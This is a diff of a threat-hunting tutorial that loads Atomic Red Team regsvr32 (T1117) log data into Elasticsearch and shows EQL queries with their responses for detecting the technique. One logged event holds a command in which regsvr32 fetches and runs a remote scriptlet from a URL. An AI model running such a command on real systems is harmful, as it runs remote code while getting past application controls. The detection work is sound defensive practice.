@@ -24,7 +24,7 @@ PUT /_index_template/my-data-stream-template
 
 ```json
 
-curl -H "Content-Type: application/json" -XPOST "localhost:9200/my-data-stream/_bulk?pretty&refresh" --data-binary "@dataset/normalized-T1117-AtomicRed-regsvr32.json"
+curl -XPOST "localhost:9200/my-data-stream/_bulk?pretty&refresh" -s -u elastic:changeme -H 'Content-Type: application/x-ndjson' --data-binary "@dataset/normalized-T1117-AtomicRed-regsvr32.json"
 
 ```
 
@@ -49,4 +49,146 @@ GET /my-data-stream/_eql/search?filter_path=-hits.events
 }
 
 ```
+
+<details>
+  <summary>Response:</summary>
+
+```json
+
+{
+  "is_partial" : false,
+  "is_running" : false,
+  "took" : 1,
+  "timed_out" : false,
+  "hits" : {
+    "total" : {
+      "value" : 143,
+      "relation" : "eq"
+    }
+  }
+}
+
+```
+
+</details>
+
+
+#### Check for command line artifacts
+
+```json
+
+GET my-data-stream/_eql/search?filter_path=hits.events
+{
+  "query": """
+    any where process.name == "regsvr32.exe" and  process.command_line.keyword !=null
+  """,
+  "size": 200
+}
+
+```
+
+<details>
+  <summary>Response:</summary>
+
+```json
+
+{
+  "hits" : {
+    "events" : [
+      {
+        "_index" : ".ds-my-data-stream-2023.04.28-000001",
+        "_id" : "9v9YxocBJz9yVPk--OPB",
+        "_source" : {
+          "process" : {
+            "parent" : {
+              "name" : "cmd.exe",
+              "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010AA385401}",
+              "executable" : """C:\Windows\System32\cmd.exe"""
+            },
+            "name" : "regsvr32.exe",
+            "pid" : 2012,
+            "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
+            "command_line" : "regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll",
+            "executable" : """C:\Windows\System32\regsvr32.exe""",
+            "ppid" : 2652
+          },
+          "logon_id" : 217055,
+          "@timestamp" : 131883573237130000,
+          "event" : {
+            "category" : "process",
+            "type" : "creation"
+          },
+          "user" : {
+            "full_name" : "bob",
+            "domain" : "ART-DESKTOP",
+            "id" : """ART-DESKTOP\bob"""
+          }
+        }
+      }
+    ]
+  }
+}
+
+```
+
+</details>
+
+#### Check for malicious script loads
+
+Check if regsvr32.exe later loads the scrobj.dll library:
+
+```json
+
+GET /my-data-stream/_eql/search
+{
+  "query": """
+    any where process.name == "regsvr32.exe"  and dll.name == "scrobj.dll"              
+  """
+}
+
+```
+
+<details>
+  <summary>Response:</summary>
+
+```json
+
+{
+  "is_partial" : false,
+  "is_running" : false,
+  "took" : 1,
+  "timed_out" : false,
+  "hits" : {
+    "total" : {
+      "value" : 1,
+      "relation" : "eq"
+    },
+    "events" : [
+      {
+        "_index" : ".ds-my-data-stream-2023.04.28-000001",
+        "_id" : "Fv9YxocBJz9yVPk--OTC",
+        "_source" : {
+          "process" : {
+            "name" : "regsvr32.exe",
+            "pid" : 2012,
+            "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
+            "executable" : """C:\Windows\System32\regsvr32.exe"""
+          },
+          "dll" : {
+            "path" : """C:\Windows\System32\scrobj.dll""",
+            "name" : "scrobj.dll"
+          },
+          "@timestamp" : 131883573237450016,
+          "event" : {
+            "category" : "library"
+          }
+        }
+      }
+    ]
+  }
+}
+
+```
+
+</details>
 
